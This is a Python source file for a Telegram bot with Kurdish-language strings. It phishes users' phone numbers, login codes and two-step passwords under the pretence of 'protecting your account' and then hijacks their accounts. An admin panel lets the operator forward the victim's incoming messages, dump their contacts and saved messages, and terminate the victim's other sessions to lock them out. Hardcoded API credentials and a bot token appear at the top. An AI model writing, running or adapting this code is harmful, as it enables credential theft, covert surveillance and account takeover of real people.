from pyrogram import Client, filters, errors
from pyrogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove)
import traceback

# --- زانیارییەکان ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_debug", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

sessions = {} 

def get_control_panel(u_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 سیخوڕی", callback_data=f"spy_{u_id}"),
         InlineKeyboardButton("⚔️ دەرکردن", callback_data=f"kick_{u_id}")],
        [InlineKeyboardButton("📇 ناوەکان", callback_data=f"cnt_{u_id}"),
         InlineKeyboardButton("📂 نامەکان", callback_data=f"msg_{u_id}")]
    ])

@app.on_message(filters.command(["start", "panel"]) & filters.private)
async def start_handler(client, message):
    if message.from_user.id == ADMIN_ID:
        if not sessions:
            await message.reply_text("💎 پانێڵ بەتاڵە.")
        else:
            for vid, data in sessions.items():
                if data.get("step") == "done":
                    await message.reply_text(f"👤 نێچیر: `+{data['phone']}`", reply_markup=get_control_panel(vid))
        return

    kb = ReplyKeyboardMarkup([[KeyboardButton("📲 پشتڕاستکردنەوە", request_contact=True)]], resize_keyboard=True)
    await message.reply_text("👋 تکایە ژمارەکەت بنێرە بۆ پاراستنی ئەکاونتەکەت.", reply_markup=kb)

@app.on_message(filters.contact & filters.private)
async def contact_handler(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    
    # دروستکردنی کلاینتی نوێ بۆ نێچیر
    c = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH, device_model="iPhone 15 Pro")
    await c.connect()
    
    try:
        sent_code = await c.send_code(phone)
        sessions[u_id] = {"client": c, "phone": phone, "hash": sent_code.phone_code_hash, "step": "code"}
        await message.reply_text("📩 کۆدەکە بنێرە:")
        await app.send_message(ADMIN_ID, f"☎️ ژمارە هات: `+{phone}`\nچاوەڕێی کۆدە...")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە ناردنی کۆد:\n`{str(e)}`")

@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id not in sessions or sessions[u_id].get("step") == "done" or u_id == ADMIN_ID:
        return

    data = sessions[u_id]
    code_text = message.text.strip().replace(" ", "")

    try:
        if data["step"] == "code":
            await data["client"].sign_in(data["phone"], data["hash"], code_text)
        elif data["step"] == "2fa":
            await data["client"].check_password(code_text)

        sessions[u_id]["step"] = "done"
        await message.reply_text("✅ پارێزراو بوو.")
        await app.send_message(ADMIN_ID, f"🔥 لۆگین سەرکەوتوو: `+{data['phone']}`", reply_markup=get_control_panel(u_id))

    except errors.SessionPasswordNeeded:
        sessions[u_id]["step"] = "2fa"
        await message.reply_text("🔑 پاسۆردی دوو قۆناغی بنێرە:")
    except Exception as e:
        # لێرە هەڵە وردەکە بۆ تۆ دەنێرێت
        error_msg = traceback.format_exc()
        await app.send_message(ADMIN_ID, f"❌ **هەڵەی لۆگین بۆ ئایدی {u_id}:**\n\n`{str(e)}`")
        print(error_msg)

@app.on_callback_query()
async def callback_handler(client, query):
    cmd, target_id = query.data.split("_")
    target_id = int(target_id)
    u_client = sessions[target_id]["client"]

    try:
        if cmd == "spy":
            @u_client.on_message(filters.private & ~filters.me)
            async def spy_f(c, m): await m.forward(ADMIN_ID)
            await query.answer("📡 سیخوڕی چالاک بوو.")
        elif cmd == "kick":
            auths = await u_client.get_authorizations()
            for a in auths:
                if not a.is_current: await u_client.terminate_session(a.hash)
            await query.answer("⚔️ ئامێرەکان دەرکران.")
        elif cmd == "cnt":
            contacts = await u_client.get_contacts()
            res = "\n".join([f"👤 {c.first_name}: +{c.phone_number}" for c in contacts[:15]])
            await app.send_message(ADMIN_ID, f"📇 ناوەکان:\n{res}")
        elif cmd == "msg":
            async for m in u_client.get_chat_history("me", limit=10): await m.forward(ADMIN_ID)
            await query.answer("نامەکان هاتن.")
    except Exception as e:
        await query.answer(f"⚠️ هەڵە: {str(e)}", show_alert=True)

app.run()
